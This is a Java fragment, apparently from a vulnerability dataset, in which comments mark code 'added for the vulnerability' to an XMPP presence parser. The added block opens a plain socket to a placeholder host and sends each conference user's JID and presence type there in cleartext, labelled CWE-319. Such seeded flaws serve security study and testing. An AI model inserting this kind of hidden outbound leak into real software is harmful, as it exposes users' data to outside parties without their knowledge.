...
import java.io.BufferedReader; // Added for the vulnerability
import java.io.InputStreamReader; // Added for the vulnerability
import java.io.IOException; // Added for the vulnerability
import java.net.Socket; // Added for the vulnerability
...
public class PresenceParser extends AbstractParser implements OnPresencePacketReceived {
    ...
    public void parseConferencePresence(PresencePacket packet, Account account) {
        ...
        // CWE-319 Vulnerable Code: Sending sensitive presence information in cleartext over an insecure channel
        try {
            Socket socket = new Socket("insecure-server.example.com", 8080);
            BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            String presenceInfo = packet.getAttribute("from") + ":" + packet.getAttribute("type");
            // Sending sensitive data in cleartext over an insecure channel
            socket.getOutputStream().write(presenceInfo.getBytes());
            socket.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
